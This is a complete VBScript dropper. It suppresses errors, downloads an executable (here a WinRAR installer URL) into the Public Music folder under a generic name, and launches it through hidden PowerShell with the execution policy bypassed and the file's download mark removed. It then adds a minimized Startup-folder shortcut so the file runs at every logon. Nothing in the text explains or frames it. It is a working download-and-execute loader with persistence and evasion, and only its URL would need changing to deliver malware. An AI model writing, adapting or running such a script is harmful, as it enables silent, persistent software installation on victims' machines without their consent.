On Error Resume Next

Dim url, filePath, shell, fso, musicPath, psCommand, startupPath, shortcut

url = "https://www.win-rar.com/fileadmin/winrar-versions/winrar-x64-713ar.exe"

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Target path: Public Music folder
musicPath = "C:\Users\Public\Music"
filePath = fso.BuildPath(musicPath, "file.exe")

' PowerShell: download + unblock + run
psCommand = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
            """$f='" & filePath & "'; " & _
            "Invoke-WebRequest -Uri '" & url & "' -OutFile $f; " & _
            "Unblock-File -Path $f; " & _
            "Start-Process -FilePath $f"""

shell.Run psCommand, 0, True

' Create shortcut in Startup folder
startupPath = shell.SpecialFolders("Startup")
Set shortcut = shell.CreateShortcut(fso.BuildPath(startupPath, "file.lnk"))
shortcut.TargetPath = filePath
shortcut.WorkingDirectory = musicPath
shortcut.WindowStyle = 7
shortcut.Save
